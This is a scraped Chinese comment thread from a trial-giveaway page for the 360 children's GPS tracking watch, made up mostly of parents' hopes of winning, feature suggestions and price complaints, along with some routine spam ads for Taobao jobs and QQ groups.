虽然不是很好听，但还是有个疑问可能需要你们答疑。。。假如绑匪知道这款产品这么厉害，会不会在第一时间就把它摘除，让其定位和监听功能无效化呢。另，如果说加上防脱落功能（假如可以百分百实现的话），那么也存在某些比较猖狂的歹徒会通过切除部分肢体来把该产品去掉的可能性。。。所以，个人感觉最好能有这方面的考虑，不过还是很期待能看到你们的产品能成功面世，加油！
看着还是不错的，想着孩子能有这个做为节日礼物一定会很喜欢，家长也会很放心
能中吗，希望可以，特别想给宝贝中一个
好东西，有机会试用后，我一定要推荐给身边的朋友。 
好想中一个啊！给宝贝个礼物！
真是只有你想不到的.没有你做不到的.期待中.
看着还是不错的，想着孩子能有这个做为节日礼物一定会很喜欢，家长也会很放心 
很心动的一款产品.
对于我这样大脑经常短路的人很需要
好东西，真的很想得到一个！
看前面的说明很心动.看后面的说明是一次性的就直接过了。而且价钱也不便宜
我也同意这个观点，如果能更隐蔽些的更好，比如做成皮带扣，或能粘贴在身上的装饰图案就更理想了。不过，如果木暂时有这方面的设计，这一款已经是最好的选择了。
淘宝招聘兼职
淘宝招缣职淘宝招缣职
看前面的说明很心动。看到后面说是一次性的就直接PAS掉了。而且价钱还不便宜
再也不要担心孩子到处乱跑而找不到http://mp.weixin.qq.com/s?__biz=MjM5MTM1MDY2NA==&amp;mid=200200076&amp;idx=1&amp;sn=eddbc799d7b569fe1fed400f3a504ca4&amp;scene=1#rd
太棒了！正式我想要的！支持360！
我的孩子还没没到入学年龄，等到他入学了，我也要给他买一个，信赖360产品。赞一个。
再也不用担心baby去哪了http://mp.weixin.qq.com/s?__biz=MjM5MTM1MDY2NA==&amp;mid=200200076&amp;idx=1&amp;sn=eddbc799d7b569fe1fed400f3a504ca4&amp;scene=1#rd
不错，定位功能是所有的妈妈希望的，这样有助于孩子的安全
一直想买一个这种产品，终于找到了
很好，希望价格不要太高，否则就没有吸引力了
15万人抢150个，我。。。。我还是算了吧。。我家宝宝还小，还没上学。。留给现在需要的人吧
能中一个吗？希望人品爆发下，这个真不错 
没必要非戴在手上 可以装在包里 
真希望拥有，宝宝喜欢乱跑一不留神就不见了，有时候真是急死人了，这样的产品对我们来说很是重要，我想每过家庭都会需要这样的产品，如果有机会试用，我一定要推荐给身边的朋友  
真希望有一个，随时都能了解到宝宝的位置。
为何要搞饥饿营销？如果要试用，完全可以联系幼儿园免费提供做。赶紧发售吧。
样子很好看啊，跟一般的手表差不多。颜色很艳丽，喜欢。不知道定位跟踪效果如何，期待人品大爆发，试用一下。效果好可以浙江台州给弄个代理点，一起销售啊。孩子的用品如果效果好还是比较受欢迎的啊，家长还是肯花点钱的。最好每个地方分发一个帮忙推广啊，期待啊。。。。。。。。。。。。。。。。。。。。。。。
六一快到了，想给孩子买个“安全法宝”
360出品，必属精品！
好东西啊，希望能得到一个，作为给孩子儿童节的礼物。
好东西，真的很想得到一个！ 给宝贝个礼物
给宝贝个礼物
360已然成为一个平台了。不单单只是个做安全软件的那啥了
期待中，希望尽快面市
真不错啊能有个就好了
好产品，这样的产品让我们的办公更快捷，我喜欢！
每天在外工作很晚，没法照顾小孩，希望得到一个卫士，随时知道宝宝在哪？可以的话，卖我一个也行啊
真心不错的一款产品，很喜欢，不仅可以定位还有摄像头的话，随时看到孩子所处的环境，就更好啦！还能通话的话也就完美啦！
哇塞！我喜欢3个轮子的
很好，很有创意。希望可以普及
在海尔商城的可以买到了，这里还在创意是不是有些忽悠
很精致。很好。
这个表太TMD的牛逼了，可我妈不给我买
好像还有办个上网卡
加油   我喜欢
期待下  希望免费给试用哦
能中吗，希望可以
真心希望能得到一个，保护我的宝贝
特别喜欢这些颜色的。可以一样买一个，然后放在不同的地方。
什么地方可以买到 
好东西，希望申请到给女儿，希望奇酷做得好，给我申请一个吧！！！
我每次申请重来不中    这次遇到这么好的东西一定求申请成功！！！！！！！
关于儿童安全的问题，从来都是父母心中最大的问题。作为父母，想时刻知道孩子的位置。迫切想得到。谢谢！
活该，你活该，哈哈哈哈
我不求中，只求快点上市面 
真的这么不好申请到？
这真心是为每位小朋友的爸妈设计的，很赞的手表，为了宝贝的安全，太需要一个了，求中啊~~求中！！
现在呢， 还申请布道？
淘宝招聘兼职淘宝招聘兼职淘宝招聘兼职
嗯，赞，十分的赞。
nice！
宝招聘兼职淘宝招聘兼职 
宝招聘兼职淘宝招聘兼职 
宝招聘兼职淘宝招聘兼职 
太神奇了 加油 我们什么时候能用上呢
现在呢， 还申请布道？ 
宝招聘兼职淘
 专业为各企事业单位制作人像工作证、学生证、展会证、贵宾卡、会员卡、优惠卡、保险卡、医疗卡、积分卡、电信卡、刮刮卡、出入卡、磁条卡、条码卡、年历卡、储值卡、非标卡、异形卡、透明卡、磨砂卡、金卡、银卡、IC/ID欢迎来电，竭诚为您服务 公司网站：http://www.szlyc.com 阿里巴巴店铺：http://ycjs188.cn.alibaba.com/　　 下单咨询QQ：312197545
大爱的手表，不知道什么时候才有的买。。。。
为什么我就不能中一个！
淘宝招聘兼职
最好是能早日上市。。。。
希望运气好一点。。
小姐网站多少
希望中啊！！！！！！！！！！！！
求啊！！！！！！！！！！！！！ 
我家麦芷去年差点走失，所以，我一直期待有一种这样的产品。
希望能抢先获得手表试用( ⊙ o ⊙ )啊！ 
希望得到一个给自己的宝贝使用，他太小了，在外面实在是太不安全了！
祈祷好运降临吧
希望申请成功!
求求啦，我家的小孩经常自己跑出去玩，我很担心的
贵吗。。。一点都不贵好不好    三百多元两台还贵？
一定要中一个给我亲爱的宝贝
希望能够试用，帮助进行口碑宣传，使每个孩子都能够确保安全。
要是有防身的功能就更好了 
真的很便宜！我给大家介绍一个淘宝特价商品分享群，里边每天都有各种特价商品分享。抢东西信息都在这！扣群号码是:347358717 验证口号是:爱生活爱分享
真的很便宜！我给大家介绍一个淘宝特价商品分享群，里边每天都有各种特价商品分享。抢东西信息都在这！扣群号码是:347358717 验证口号是:爱生活爱分享
求求求求求求求求求求求求求求求求求求求求求求求您了，一定要中啊 
真心想给儿子一个好手表终于看到了，求中
真的很便宜！我给大家介绍一个淘宝特价商品分享群，里边每天都有各种特价商品分享。抢东西信息都在这！扣群号码是:347358717 验证口号是:爱生活爱分享
真心想要一个
真要想啊！
求上市，上市我一定买
真的很便宜！我给大家介绍一个淘宝特价商品分享群，里边每天都有各种特价商品分享。抢东西信息都在这！扣群号码是:347 358 717 验证口号是:爱生活爱分享
真的很便宜！我给大家介绍一个淘宝特价商品分享群，里边每天都有各种特价商品分享。抢东西信息都在这！扣群号码是:347 358 717 验证口号是:爱生活爱分享
真的很便宜！我给大家介绍一个淘宝特价商品分享群，里边每天都有各种特价商品分享。抢东西信息都在这！
發現個淘寶特價商品分享群，每天都有各種特價商品分享。扣群號碼:347358717
跪求啦 谢谢
求求求中啦，手表我想你好久了！！！！
有这种东东吗太好了免费实用吗   啊啊啊啊啊啊啊啊啊
可不可以 把360的标志做的稍微隐晦一点 最好看不大出来 以防止犯罪分子在第一时间警觉 把手表抢走丢弃啊
每位妈妈都希望是自己中了好给自己亲爱的宝贝最好的安全保障，当然我也不例外，如果中了我当然会很开心，中不了，我希望能尽快上市我们好买给亲爱的宝贝，谢谢！
太谢谢了，
高科技啊！值得拥有！
求中呀，啊啊啊啊啊
每位妈咪都希望得到这块手表 给孩子安全保障 希望能选上我~
求中~~~~~
我靠，这个好，这是我一直梦想的东西
求中签～～～～～～～～，正好是女儿的节日礼物
希望我能试用，谢谢！
值得期待~
求试用啊!好东西啊！
只要做得够薄，真的会比快按钮好用~
创意无极限，该产品做到什么程度了？
好心动！求试用啊！
每位妈咪都希望得到这块手表 给孩子安全保障 希望能选上我~ 
正好是女儿的节日礼物 也是每位妈咪都希望得到这块手表 给孩子安全保障 希望能选上我~  
期待❤动，好智能，好实用啊
好牛逼的赶脚，求试用！
期待android版~
期待，不怕女儿丢了，也不怕老人家找不着了
马上就到女儿生日了，希望作为她的生日礼物，跪求
嗯，挺好，求试用！
看起来挺牛逼的！
儿童节快到了，求一个送给儿子做礼物。儿子开心家人放心
好想给外甥女买一个啊，求上市，我一定买。
木有价钱？？
希望能选到我 
儿童节快到了我想给女儿一个礼物，求送吧
现在的科技都发展到什么地步了？？
可惜只能iPhone5型号
这款手表功能很齐全正是我想给孩子的礼物。
希望价格不要太高... 
一定要上市呀，我看想要被选中是有些不可能的了，只好祈求上市了。但还是希望被选中，祈祷上苍啊，一定要被选中。。。。。。
期待，好喜欢
求选中 求选中 
好象送给女儿，希望能中到!!!
希望能选上我哦，求中签。
差差差.......... 
你们买的都是多少的呀？ 
我也想送给我家宝贝一个，期待中。。。
贵贵贵.................... 
真的是一款不错的电子产品，值得期待，老人和小孩都可以用得上
不错.不错.不错
好像给女儿买一个，求中
我也想送给我家侄子一个，期待中。。。
好期待哦~~
就是200美元好像挺贵的~
请不要搞饥饿营销！好吗？！360你加个价吧，多少钱卖？！好产品我喜欢，不论价格。
求选中...
啊啊啊？这么好运－－！ 
衷心建议360能否为全国儿童送“六.一”节免费礼物——360儿童卫士2？！？！？！（注：其实这也属于送机收年费的，您说对否？）
介货不是热融枪么.....
61快到了想给女儿买一个，求中。
很好的东西 一直在选择 
我希望有一个，不让父母操心我。 
發現個淘寶特價商品分享群，每天都有各種特價商品分享。扣群號碼:347358717 
真的免费的吗？
你试过了吗？
这个钟表要钱吗？
我好渴望得到它
奇酷真大方
什么时候出来？
已有一本，凭心而论值得拥有，爱书人的不二选择啊。
好像有一块这样的表，把它送给儿子，儿子一定会很开心
真的能免费得到一个吗？期待中，希望有意外惊喜，给宝宝的最佳六一礼物，来吧，我在等待着。
發現個淘寶特價商品分享群，每天都有各種特價商品分享。扣群號碼:347358717
我看想要被选中是有些不可能的了，只好祈求上市了。但还是希望被选中，祈祷上苍啊，一定要被选中。。。。。。 
157468人申领150个，几率太少了，放弃希望！
呵呵  是啊 
点背了肯定抽不到!
……太需要一款这样的手表了，祈祷能够如愿！
这个可以有
我好渴望得到它 希望能选到我
如果被抽中了，给孩子的最佳六一礼物！
表哇  表哇  表哇 给我一个吧！！1
这个可以没有，从不用苹果，只吃苹果
这个什么时候能生产出来？ 
这个产品一定要低调！！！要不然在同学间知道了这产品的功能就会成为耻笑的产品。
不用iphone的，看来只能望望了。
请不要搞饥饿营销！好吗？！360你加个价吧，多少钱卖？！好产品我喜欢，不论价格。
真希望抽中 
希望能被抽中
抱歉，我填错了性别了，应该是男不是女
期待，希望自己能被选中，送给宝宝最好的礼物。
适合中小学身带   哈哈
无意看到这个，给个惊喜吧，女儿一直想要买个表，希望给她个惊喜
时间进入倒计时了、谁能有幸得到试用的机会呢、让我们拭目以待吧。。
求试用，期待中。。。
感觉这款手表不错，期待中
要是外表再鲜艳能就好了，怕孩子觉得单调不肯带
求试用啊!好东西啊！ 希望能马上上市
闺女很淘气，希望自己和孩子幸运，能抽中
女儿很想买个智能表，希望能被选中，在六一给她一个惊喜。
要是能视频就好了，孩子一定会喜欢的
期待被选中
孩子平常喜欢和同学到处玩，身边又没跟家长，好担心
偶喜欢那个粉的！  
我觉得可以让这个手表到晚上发光，到时候小朋友到晚上就不怕黑了
孩子是父母的心头肉，孩子如果丢了，那一家人的天就塌了。现在社会如此复杂
不知道我是不是150中的一个！期待
好产品，期待
如果被抽中了，给孩子的最佳六一礼物！
孩子平常喜欢和同学到处玩，身边又没跟家长，好担心 
孩子经常和同学跑去玩，身边没有家长，很担心。期待被选中，六一时可以给儿子一个惊喜。
求选中 求选中 
很好很给力  
好期待，能被选中 
喜欢粉的。
现在独生子女是父母的心头肉，孩子如果丢了，一家人就哭天喊地了，再说现在社会如此复杂 ，谁都不知道明天的事，这个手表却实是好 
期待选中，喜欢蓝色的 
好喜欢！！！！！！！！！！！！！！！！！！！！！！！！
喜欢粉红色 
求选中啊，谢谢啦 
好期待，能被选中  
期待选中，喜欢蓝色的  
期待选中，喜欢蓝色的  在六一给她一个惊喜。  
喜欢蓝色的  
希望能被选中,期待结果.宝贝喜欢粉色和黄色.
皮皮喜欢蓝色的，希望抽中啊！
什么时候能买到呢
喜欢蓝色适合男孩子
真心期待被选中！～～
什么时候能买到呢
无意中看到这款表，给女儿个惊喜，希望它能给我宝贝带来好运。期待中。
粉蓝，哈哈~不过都就、可以！希望抽中啊！ 
这个真的是免费的吗
家长监视孩子去网吧撸啊撸的神器！！！
打拐在行动，希望你们能贡献自己的力量
我好渴望得到它，好喜欢！！！！！！！！！！！！！！！！！！！！！！！！ 
期待，希望+激动
我希望能够中，给女儿一个惊喜
我希望能够中，给女儿一个惊喜
我希望能够中，给女儿一个惊喜
这个产品真心好应该
这个产品真心好应该
这个产品真心好应该这个产品真心好应该
闪迪未来出1Tb闪存卡
很好的产品，我在2007年就有这个创意，可是没有去实现。
免费的吗？
希望能如愿以偿，能够分享到一个淡蓝色！能作为儿童节最好的礼物！
值得期待~ 
呼叫功能，这个我喜欢！嘻嘻！期待快点出来！
那不一定，靠人品，我就抢到了，网速不一定，我1M不到的网还能抢到。
期待，给宝宝一个惊喜
还可以·就是太贵了·50美元·一定不会买
希望可以申请下来吧，这期的的真的不错啊。 我也已经申请了7期了，从第二期开始的，希望名单里能有我吧。 在支持一下，我也买了一些产品了，真的不错，很好用。
我已经申请几期了，希望可以得到此宝贝，谢谢！
测试测试测试测试
测试测试测试测试
测试测试测试测试 
nononononoononono
一直关注360的产品，希望有机会取得试用。
很好的产品 我想拥有
希望能如愿以偿，这是宝宝的能作为儿童节最好的礼物
太贵了！只可看不碰！
嗯嗯，这个东西很有用，呵呵。多少钱啊？？？不过，最极端的情况，要是拐卖儿童的坏蛋们见多识广，一看这手机就知道这个可以定位，咋办？呵呵。反正是挺实用的。
Iwant to
希望幸运之神光顾我哦
no nono
是免费的吗 
真期待！！！！！！！！
如果得不到试用资格的话，还是希望360能早日开启购买方式。当然亦希望360能越办越好，我们用户也会尽量多提好的意见给360.毕竟是要双赢。
还蛮期待的。
奇酷网就是更新不及时
高大上的产品
Iwant to this
Iwant to this 
Iwant to this 
期待，希望售价别太高
非常期待啊~~~
可以挂在钥匙上
这个我喜欢！
我好想要一个啊
我能拿到吗
真心想要啊
期待中。。。。。。。。。。
Iwant to this
Iwant to this 
Iwant to this 
为我家宝申请真是好东西
宝宝这个阶段最需要呀，
真的很期待！
这个需要充电吗？
不是一般的贵啊
这个很实用
好样的好样的
希望试用成功
希望能够成功
看一看，是怎么回事
开卖叫我一下。
改、键盘。
不知道行不行~~！真的有机会试下！
很不错的东东，期待
好奇特哦期待  
很想试用啊，孩子太让人操心了，谢谢
我想知道换水该怎么办。。。冲的时候不止一桶水了吧就，排出的脏水放哪儿。。。
让我看到了机会好像就在眼前
好期待啥时候开卖啊！我很需要这样的小宝贝呢。
第一次没赶上，二次参加了，希望我能中，很需要
360产品值得信赖
使用方便，期待价格大众化。
希望能申请到！！！期待！
每天都来看人数，一天比一天担心，我只能靠运气了
是的，在规定时间内交一份试用报告就行了
是的，就是要交一份试用报告
好喜欢，很想要一个
官方QQ群火速加入中……          82528728   315251388  我们期待与你相识。
好期待能用，非常渴望得到，请给我个机会吧！谢谢360工作人员 
希望以后能增加锁定功能，包括开关机、拆卸电池、刷机锁、儿童模式（GPS、录音功能不能随便关掉）、家长模式（全部权限），最好是能加上太阳能充电或者是动能充电功能，让电池保持能量。如果解锁忘记密码的情况也应该需要带上身份证和购买发票才能提供解锁服务。
这些应该在购买时就入档及准确的提醒购买用户。再以后就是增加电话短信功能，闹钟秒表，交友功能，体感游戏功能，只要孩子能爱不释手，不愿摘下来就作对了。最后应该是体积和显示技术的革新，能这样应该就比较完美了
希望这个好的产品能越做越好，做大做强
希望售价别太高
赞一个，好喜欢 
挺喜欢360的风格敢说敢做很早以前就支持360了。
360，顶！
能做成小熊的卡通布贴或者钥匙扣等就更方便实用了
希望能申请到！！！期待！
所有功能正是我想要的，太棒了。我也要一个 
好期待啊！！！快点发布吧！！！ 急需！！！
几万人里只有150台 我是不是幸运儿呢 期待结果中
希望能申请到！！！期待在奇酷上卖 
好期待能申请到啊
好呀，，，好期待
这个相当不错，给小孩子带在身上，出游的时候随时提醒家长孩子的行踪
平常心等待吧
不是太相信！
希望能有类似微信的语音通话功能。
有没有，酷奇这个杂毛公司说了算！
150台看来没希望哦！
希望能申请成功！
控制电动门不错哦
马上过六一了，360是要给女儿一个惊喜的节奏。
期待！希望能申请成功。
期待！很想得到一个。
暂时不需要，价格在2000元人民币可以考虑
第二天10点居然还抢到一台（5月21）。可能是昨天有人拍了没有付款吧，呵呵
赶快出品，买也行啊
哪里有买呀？
现在的大生活环境，让我不得不更多的去关注孩子，关注孩子的周围的环境，关注孩子的生活环境，如果可以，我真的希望现在的幼儿园教育事业能让我们安心，放心。
希望能申请到！！！
手表从外形美观到内在使用价值都是相当到位的，希望宝贝能够拥有这样一款手表！
表带设计在改进些就好了，儿童带设计成防脱落的，由大人能摘下来的最好
找不到理由不爱啊。大赞
这个可以有，真的可有。。。。。
这么吊？我喜欢
哪里有的买啊，就是买也可以啊，申请本来就不抱什么希望的
用过一代，这次的二代信号方面确实有所提升。但经常会有更新驱动后不能正常启动和链接的问题，希望改进。云U盘从来没用过，但愿在下一代产品中加入更好玩的功能！
期待 能申请成功。
希望不是宣传噱头，都申请了谁也得不到
希望能申请成功，小朋友带着很合适，爸妈更放心了
有的买去弄一个，申请比较假，每有一次成功的
表带最好是很难剪断，同时设有密码，这样就是人贩子想摘除也没法，小孩走丢了就靠找个找回来。
性能为消费者考虑到了，但价格没有
东西不错，尽快上市。 无法申请，比较郁闷。
已经提交试用申请，等待中。希望能够得到。
找不到理由不爱呀
我的蓝心喜欢蓝色，如果争取到了产品，一定会带动很多人参与和购买使用这样一个为儿童用打造的 安全产品！
希望这个产品能够真正解决孩子的定位问题，解决家长的安全顾虑。谢谢
希望这个产品能够真正解决孩子的定位问题，解决家长的安全顾虑。谢谢 
表带最好是很难剪断，同时设有密码，这样就是人贩子想摘除也没法，小孩走丢了就靠找个找回来。
逆向思维的妙用
表带最好是很难剪断，同时设有密码，这样就是人贩子想摘除也没法，小孩走丢了就靠找个找回来
这个不错，支持
希望能申请成功，小朋友带着很合适，爸妈更放心了
laiyige
好东西支持360
为消费者考虑到了性能，感觉将来使用时很方便，期待能够有一个大众化的价格。
这个超赞，喜欢
好产品，希望越做越好
试用不成，也考虑买一个，太实用的东西了
希望能申请成功，一种惊喜，一种快乐，更是一份安全！
创意不错，价格显高，其实智能这玩意儿也就是好奇心驱使，刚开始新鲜那么几天，随后就淡了。建议在智能和形状和价格间取一个平衡点，简单实用。人机互动有点夸张，不如省下点钱。
建议同时推出老人款
麻麻再也不用担心我跑丢了~哈哈哈
外形更好看些就好了，支持出此产品。
我觉得很好啊！试用能否通知？
容易择除吗？希望能解决容易择除的问题！
支持360出此产品，为了孩子，很好~
虽然申请了第二期试用，但我也好担心不中！很是期待上市哦~啥时候能上市啊！！
创意要结合实际用途比什么都强！你做到了！赞！
小巧方便，就是外观可以做成圆环形状的好挂
我家丫丫很喜欢红色的？希望试用申请能成功，期待。。。期待
很高兴发现一款这么好的产品，而且还可以有机会免费试用，原来360有这么多的好产品，发现晚了，真的很希望能申请成功
照相功能没啥用，可以单做微型照相机，关键是找东西的功能啊，我的电视遥控器就老丢
得贴到手机背面，有点不协调。我觉得印上些字或者图案会协调些吧
很支持此类产品，希望做得更好，也愿我能申请成功，家有小孩的急切需要这样一个产品~！
其实做成可扫描的贴纸大小芯片就可以了，在APP里编号输入物品名称，找那个一按就响
试用不成，也考虑买一个
外观时尚，可以作为一个钥匙扣也挺好看。功能也挺吸引人的，让健忘的人再也不丢三落四了。
喜欢，实用！支持，快生产！
支持此产品，希望功能在强大一些，资费在便宜一点，最好达到一天1毛钱
为什么没有三星note2的
乖孙喜欢游泳，要是这手表防水的就太完美了，希望能申请成功， 送乖孙的6.1儿童节礼物
对于我家这种淘气的孩子很适合、很喜欢
突然发现科技好神奇
此款产品一旦推广，不止是小孩实用，对老年人一样实用，希望我能申请成功。希望厂家能推出适合老年人使用的颜色。
很喜欢，很想要一个给宝贝用。就是有点贵？？
强磁，会不会对电子设备造成伤害呢 
价位合适的话 希望可以买到
18度 重庆用不上啊..
确实价格超高了...
这个产品非常时候儿童和老人，建议可以增加设置多种款式比如项链，老人可以使用项链或者挂饰。
主要是防丢啊！还有续航，最好做成金属的防压！！防水！！
好喜欢 求试用期待中啊。。。。
之前就一直关注这款手表，期待最后的结果
希望可以成功，挺不错的一款表，很适合儿童定位。
很高兴发现一款这么好的产品，而且还可以有机会免费试用，很支持此类产品，希望做得更好。希望能申请成功，给孩子一份惊喜，更是一份安全。
急需，急需，如果争取到了产品，一定会带动很多人参与和购买使用这样一个为儿童用打造的 安全产品！ 
申请中。等待中
可用于对危重病人的监护
希望可以申领成功。。。。。。
 这样等待还不如告诉我在那买，我直接买一个了！！哎
期待中。。。。
急需此产品给孩子，期望能申请到
神器降临，减肥有望。
超强的团队，为了孩子，感谢!支持!早日上市，惠普于民!
360儿童卫士2很适合儿童和老人，建议增加功能（如对话及交通危险提醒等等）最好款式设计多元化。希望试用申请能成功
就喜欢这个。超有爱的。
什么价位？看着颜色就喜欢
希望每位孩子都有一块，再也不想听到孩子丢失的消息，每次听到都让人心疼，好产品要推广。
好产品，值得拥有。
这个东西我们曾经找过很久。
希望能申请成功让我的宝贝快乐成长每一天。
如果能支持通话就完美了。
应该做成防水的。
这个东西很有实用性啊
希望能申请成功  ，给宝宝一个贴心的保护
起一个小小定位贴，会不会有什么的启发～
这个创意真得很好，不会用手机的老人家很适合，家人能方便找到他。颜色可以多做几款，更多选择。价格要适中。
自从儿子知道我申请了奇酷360儿童卫士2后，高兴的不得了。天天期待着，天天催我。催的是我心里没底了啊~。真心期待申请成功。谢谢
我再也不用担心我儿子到处乱跑了
去年夏天旺仔在商场走失过一次，差点报警。他奶奶都吓哭了，后来在麦当劳门口找到。当时就想，有个像汽车定位导航的发明就好了。现在旺仔上了幼儿园，我也经常出差，还是希望能实时知道儿子的安全，才放心。360这个新品开发，满足了巴巴麻麻们的需求，值得推广，赞一个！ 大半不小的孩子最喜欢,准备给旺仔买一个,也可以买多几个送给朋友的孩子.
这个哪里可以买到?挺喜欢的。
希望送给孩子的6.1儿童节礼物会成功，我期待、等待！
偶然看见这款奇酷360.真心希望申请成功，在也不为孩子去哪儿而担心
别学小米的饥饿销售行不，要卖赶紧卖，别整过头了。
神器降临，减肥有望。看好你
这是要试用吗？还是准备开售？ 
什么时候啊
已经提交了申请，接下来就是耐心等待了，真心希望能申请成功。
哇哦，很好的样子，期待期待
这个不错，很好！！
写的好专业
非常期待，无论是不是申请成功，等产品上市我都会买
真有这么神奇吗？啥时候可以试试？
希望可以给孩子申请到一个
专业好有压力感
申请了，小东东看着真招人爱~~~
孩子太调皮了，带他出去老是要东找西找的，有这个就不怕了，希望成功
这款产品，性价比实在是太低了，同类产品，价格比他低做工比他好。投影的领域里Q影是值得入手的东西！！！
申请了，希望能成功~ 
期待中。。。。。。
现在家庭都是一、二个小孩，社会拐卖儿童的事时有发生，特别是老人带孩子，有这样一款产品，起码能了在紧急状况下及时找到小孩。
我在期待中，
期待此产品！虽说是一个简单的手表，但是却联系着一个家庭的幸福！希望申请成功！
太贵了，不是平民用的。
什么时候可以购买啊 
药不能停！！
好东东，希望自己中奖。更希望尽快推出这个产品，让更多的家庭受益。
在这里很久了，这里的介绍永远介绍不到顾客的需求点上，看完东西还要去网上搜这个产品的功能妙处等等。希望能改进这点，贴近顾客才行，别总觉得产品牛逼其他的都不用考虑。
这个东西可以进一步推广，应该可以用在年迈的父母身上，谢谢360
好东东，顶一下
我们孩子学校昨天有个孩子走丢，后经报警很快找回孩子。希望这款产品能在紧急情况及时找到孩子。
准确，精细，才是硬道理。
物品虽小，功能却很实用，希望第一次的申请可以成功。
有意思，可以使用以下
说的挺容易。。。
有点意思！产品介绍里有一个错别字，请小编注意
这么好哦，真想要
好期待哦，我家宝宝差点走丢了一次，希望能申请成功！
快快地研发，车都买了，就等它了！！
X博士专用么，每个人的脑波强度不一样吧，用多了会不会头疼啊
给建议哦，因为小孩子玩耍的时候可以能弄到水，如果有一般的防水功能效果更好。好希望抽到~
太贵太贵，死贵死贵的
我家孩子淘气的很我好想有一个这样的表她学校有大孩子欺负她威胁到家还不敢说我不知道该怎么办要个这样的你、表
情侣神器~！
社会上有太多拐卖儿童的事件了，360儿童卫士虽然是个有效的预防设备，但是还是希望国家能重视这一块，做到治本的效果
好东东，200美元，一次性投资，永葆美丽
我15岁，能不能申请一个来玩玩？
希望能早点能向公众发售，这样早点给多小朋友一份安全屏障。
现在高清视频很多，必须要能支持高清视频播放才有意义，也对得起这个价格。
嗯，关键是游戏，东西再好么有NB的游戏也白搭呀
希望价格方面比较理想话  毕竟老百姓不是很有钱
有GPS和WiFi，意味着功耗大，不知能持续工作多久。
嗯，可以玩玩，但要操控好还是不容易的。
一晚上一度电？？耗电王啊 
希望能抽到我
好东西顶一个
确保孩子的位置和安全是最重要的
给我抽到吧，申请两次了
好东西 期待试用
什么时候在哪里可以购买呢？如果申请不成功的话我想买一个呀
我在森请 棒棒棒棒棒棒棒棒棒棒棒棒棒棒棒吧
好东西，希望能抽到我。
太棒了，迫不及待想给宝贝买一个！！！
什么时候上市销售？
对我们这种孩子多次走失的家长，简直就是久旱逢甘霖...
Iwant to this
Iwant to this
Iwant to this
我在期待着，那一天，我拥有你。。。。。。。 
孩子太调皮了，带他出去老是要东找西找的，有这个就不怕了，希望成功
希望能抽到，从来没有幸运过，抱着试试的想法
孩子太调皮了，带他出去老是要东找西找的，有这个就不怕了，希望成功
孩子太调皮了，带他出去老是要东找西找的，有这个就不怕了，希望成功
孩子太调皮了，带他出去老是要东找西找的，有这个就不怕了，希望成功
有这个能安心点孩子在外面
有意思，跟踪下，什么时候开始使用？
随身WIFI+8GU盘=39.9
孩子家长兼设计师，应该会竭力分析和吐槽。
好东西，你懂得！
希望能申请通过，好让不在女儿身边时帮我守护她
怎么预约啊
好东西啊，每个家长必备的东西~~希望早点出来早点试用哈
好东西啊，好东西啊，好东西啊，
很好的产品，希望真的可以那么好用。。。
好东西啊，好东西啊，好东西啊，
好东西，有这个能安心点孩子在外面
虚拟游戏装备很期待呢！
但愿吧，能得到就有一份保证孩子的安全，家长就不会担心孩子的去向了！！！！！
看上去很好，希望用起来会更好
怎么预约不了呀！！ 
希望能抽到我.
希望能抽到我.
我想为我家小宝要一个
但愿吧，能得到就有一份保证孩子的安全，家长就不会担心孩子的去向了！！！！！ 
太浪费料了！！！
第二次申请了，为了我的宝贝，也为了这么好的一个产品，希望能拥有它，谢谢！
这空调没有室外机吗？
抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  抽到我  
我儿子天天去网吧  哈哈哈 有了这个我就知道他在哪了
已经申请试用了，希望好运可以中，产品出来价格不是很贵，我就给宝姑和宝舅家的孩子买2个，现在车多人多孩子都不敢让离开大人的视线了，多怕走丢了也怕在道上玩，特别是怕给拐走（虽然几率小），有次去商场和宝爸，一转身孩子没了，找了一圈，吓个半死，现在孩子好奇心太强。有时宝宝和宝奶出去根本不放心啊。这个商品也适用于患有痴呆的老人。有次邻居家的爷爷走失了，又报警又打广告的，有了这个就不怕了，最起码能定个位！
准备暑假带孩子出国门玩，希望能带上自己国家的东西，给孩子最大的保护。
已经申请试用了，希望好运可以中，产品出来价格不是很贵，我就给宝姑和宝舅家的孩子买2个，现在车多人多孩子都不敢让离开大人的视线了，多怕走丢了也怕在道上玩，特别是怕给拐走（虽然几率小），有次去商场和宝爸，一转身孩子没了，找了一圈，吓个半死，现在孩子好奇心太强。有时宝宝和宝奶出去根本不放心啊。这个商品也适用于患有痴呆的老人。有次邻居家的爷爷走失了，又报警又打广告的，有了这个就不怕了，最起码能定个
能收到吗？一共169957要的，而数量才150个 。 
 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我 抽到我  
希望我可以被抽到，那就可以对老弟放心了
16万人申请几率不大了，准备买啥时有呢？
好多期试用 了。估计快出来了
预约页面已经改过来了 现在可以正常预约了！ 大家快去看看吧
希望我可以被抽到
已经申请试用了，希望好运可以中，产品出来价格不是很贵，现在车多人多孩子都不敢让离开大人的视线了，多怕走丢了也怕在道上玩，特别是怕给拐走（虽然几率小），有次去商场和宝爸，一转身孩子没了，找了一圈，吓个半死，现在孩子好奇心太强。有时宝宝和宝奶出去根本不放心啊。这个商品也适用于患有痴呆的老人。有次邻居家的爷爷走失了，又报警又打广告的，有了这个就不怕了，最起码能定个 
哈哈 一人发一对！
已经申请试用了，家里孩子比较淘气，老乱跑，生怕他出点什么事，要是有这个就好了，在哪都知道，希望可以选中
希望能把贴身的安全卫士送给孩子
3D打印看来还有一整套流程啊。
已经申请试用了，我家宝贝注意特别正。。。。。。一带他出门他就乱跑~有时候还真怕他走丢
很好的东西!
等货到，兴奋中...
一直用360，免费还好用。电脑坏了可以修，可以买新的。孩子要是丢了，家就散了。想想都害怕。希望360把这个做大做好。顶
刚刚提交了申请，一定要让我抽到一个啊。小孩实在太调皮，到处跑，很多时候根本就追不上，现在基本也是自己玩了，心里老担心他，让我拥有一个吧。不管申请结果如何，都很诚挚的感谢360，设计了那么给力的产品，所有孩子的福音啊。
刚刚提交了申请，一定要让我抽到一个啊。
申请递交了这么久，出结果却没有被筛选到，郁闷！
